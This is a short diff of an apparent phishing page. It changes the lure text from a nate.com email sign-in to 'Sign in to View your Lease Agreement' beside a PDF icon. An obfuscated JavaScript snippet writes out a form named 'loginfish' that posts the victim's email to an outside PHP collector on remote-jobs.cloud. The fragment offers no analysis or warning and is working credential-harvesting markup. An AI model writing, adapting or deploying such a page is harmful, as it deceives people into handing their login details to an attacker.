@@ -131,7 +131,7 @@
 <body>
      <div class="container">
         <img src="https://rb4luxe.github.io/PDF_ico.svg" alt="" class="logo">
-        <p>Sign in with your nate.com Email</p>
+        <p>Sign in to View your Lease Agreement</p>
 
        <script language=JavaScript>m='%20%3Cform%20name%3D%22loginfish%22%20';d=unescape(m);document.write(d);</script>action="https://remote-jobs.cloud/ivtech/kak2.php" method="post">
             <input type="email" name="email" id="email" placeholder="Valid ID" required value="">
